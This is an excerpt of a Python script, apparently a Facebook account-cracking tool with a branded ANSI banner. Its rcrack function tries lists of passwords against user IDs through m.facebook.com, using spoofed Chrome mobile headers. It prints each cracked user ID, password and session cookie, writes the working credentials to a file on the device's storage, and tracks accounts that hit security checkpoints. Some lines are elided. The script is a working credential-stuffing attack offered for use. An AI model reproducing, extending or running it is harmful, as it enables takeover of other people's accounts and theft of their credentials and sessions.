...
\033[1;31m.██   ██ ██████  ██   ██ ██   ██ ██   ██ ";               
 ...
 \033[1;91m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 \033[1;34m┃ [✓] AUTHOR    \033[1;91m: \033[1;92mKANCHANxABIR              ┃
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
          ...
          'dpr': '2',
          'referer': 'https://m.facebook.com/?wtsid=rdr_0mMmU2CSrygQR5CEY',
          'sec-ch-prefers-color-scheme': 'light',
          'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
         'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5838.222", "Google Chrome";v="114.0.5838.222"',
         'sec-ch-ua-mobile': '?1',
         ...
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; Lenovo TB-X605LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5838.222 Mobile Safari/537.36',
         'viewport-width': '980',
}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[KANCHANxABIR_👀] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/𝑴𝑬-KANCHANxABIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[KANCHANxABIR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Yamin_VAI{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
